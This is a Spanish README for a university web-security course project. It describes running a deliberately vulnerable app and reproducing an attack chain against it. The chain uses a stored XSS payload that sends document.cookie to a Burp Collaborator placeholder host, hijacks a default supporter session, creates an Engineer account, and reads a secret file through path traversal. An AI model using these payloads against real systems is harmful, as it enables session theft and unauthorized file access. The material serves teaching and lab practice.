# seguridad-apps-web
TP Grupal de la asignatura Seguridad en Aplicaciones Web de la UTN FRBA 1c 2022

## Requerimientos
Se debe instalar docker y docker-compose para correr la aplicacion.

## Ejecución
Parados en la carpeta principal del repositorio, ejecutar:

> docker-compose up --build

**Nota: no se deben tener en uso los puertos 3306 ni 3000 ya que son los que utiliza la aplicación.**

La aplicación se encontrará corriendo en:
> localhost:3000

## Reproducción de vulnerabilidades

*Paso 1)* Con el usuario sin autenticar, enviar la siguiente consulta habiendo abierto el Burp Suite Collaborator para obtener un subdominio burpcollaborator.net y recibir las credenciales en dicho colaborador.


    <script> 

        fetch('https://TU-SUBDOMINIO-ACA.burpcollaborator.net', { 

        method: 'POST', 

        mode: 'no-cors', 

        body:document.cookie 

        }); 

    </script>

*Paso 2)* Ingresar con el usuario supporter para que ejecute ese script y le envie al colaborador su access_token. El usuario supporter existe por defecto: usuario: supporter, contraseña: supporter123

*Paso 3)* En el Burp Collaborator tiene que haberse recibido la interaccion con la request que tiene el access_token del supporter. Colocar dicha cookie en el usuario no autenticado para pasar a estar autenticado.

*Paso 4)* Una vez dentro, ir al directorio `/createUsers` y crearse un usuario con rol Engineer.

*Paso 5)* Hacer `/logout` con el usuario supporter e ingresar con el usuario Engineer que acabamos de crear.

*Paso 6)* Con el engineer se entra directo al panel de playground de IaC. Aca se puede colocar el query_param *filename* de la siguiente forma para leer el contenido del archivo secret-password: `/iac_template?filename=../../secret-password`

*Paso 7)* Decodificar el contenido del archivo que nos imprimio el pantalla que se encuentra en hash MD5 para obtener el password.